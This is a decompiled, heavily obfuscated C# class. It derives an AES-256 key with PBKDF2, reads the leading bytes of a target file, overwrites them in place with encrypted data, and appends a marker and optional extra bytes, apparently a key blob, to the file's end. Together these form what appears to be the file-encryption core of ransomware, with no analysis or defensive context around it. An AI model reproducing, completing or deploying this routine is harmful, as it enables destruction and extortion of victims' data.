using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace YBTDaqZXTw;

public static class mYdJdJnIkYOjBSNk
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] zCsTXlHwmxYOHTJB(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = wpYJXFmXgbeoY(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes wpYJXFmXgbeoY(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] SWdoFjhxOTmB(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (fdvkylEGapkbT.JhBqPOdPslDLd == getString_0(107396811))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (fdvkylEGapkbT.TfpcYTfYwiZ)
			{
				try
				{
					File.AppendAllText(fdvkylEGapkbT.XTpFtiqHigTwzn, getString_0(107390485) + string_0 + getString_0(107404681) + ex.Message + getString_0(107396632));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void MXdhDIMXmDxxv(string bTSHcpffEV, byte[] jWrCeXmSuYcDoj, byte[] KmwLzxBJWYqTJ = null)
	{
		try
		{
			byte[] array = null;
			if (fdvkylEGapkbT.JhBqPOdPslDLd == getString_0(107396811))
			{
				array = (fdvkylEGapkbT.dKfSpybLYvFvyKv ? Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(fdvkylEGapkbT.NcfjRizCakajSGl) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404623)) + Convert.ToString(fdvkylEGapkbT.FSmYeUMoln) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404623))) : Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(fdvkylEGapkbT.NcfjRizCakajSGl) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404600)) + Convert.ToString(fdvkylEGapkbT.FSmYeUMoln) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404600))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(bTSHcpffEV, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(jWrCeXmSuYcDoj, 0, jWrCeXmSuYcDoj.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(bTSHcpffEV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!fdvkylEGapkbT.dKfSpybLYvFvyKv)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(KmwLzxBJWYqTJ, 0, KmwLzxBJWYqTJ.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (fdvkylEGapkbT.dKfSpybLYvFvyKv ? Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(fdvkylEGapkbT.NcfjRizCakajSGl) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404623)) + Convert.ToString(fdvkylEGapkbT.FSmYeUMoln) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404623))) : Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(fdvkylEGapkbT.NcfjRizCakajSGl) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404600)) + Convert.ToString(fdvkylEGapkbT.FSmYeUMoln) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404600))));
			FileStream fileStream2 = new FileStream(bTSHcpffEV, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(jWrCeXmSuYcDoj, 0, jWrCeXmSuYcDoj.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(bTSHcpffEV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!fdvkylEGapkbT.dKfSpybLYvFvyKv)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(KmwLzxBJWYqTJ, 0, KmwLzxBJWYqTJ.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (fdvkylEGapkbT.TfpcYTfYwiZ)
			{
				try
				{
					File.AppendAllText(fdvkylEGapkbT.XTpFtiqHigTwzn, getString_0(107390485) + bTSHcpffEV + getString_0(107404614) + ex.Message + getString_0(107396632));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (fdvkylEGapkbT.dKfSpybLYvFvyKv ? Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(fdvkylEGapkbT.NcfjRizCakajSGl) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404623)) + Convert.ToString(fdvkylEGapkbT.FSmYeUMoln) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404623))) : Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(fdvkylEGapkbT.NcfjRizCakajSGl) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404600)) + Convert.ToString(fdvkylEGapkbT.FSmYeUMoln) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404600))));
			FileStream fileStream4 = new FileStream(bTSHcpffEV, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(jWrCeXmSuYcDoj, 0, jWrCeXmSuYcDoj.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(bTSHcpffEV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!fdvkylEGapkbT.dKfSpybLYvFvyKv)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(KmwLzxBJWYqTJ, 0, KmwLzxBJWYqTJ.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static mYdJdJnIkYOjBSNk()
	{
		Strings.CreateGetStringDelegate(typeof(mYdJdJnIkYOjBSNk));
	}
}
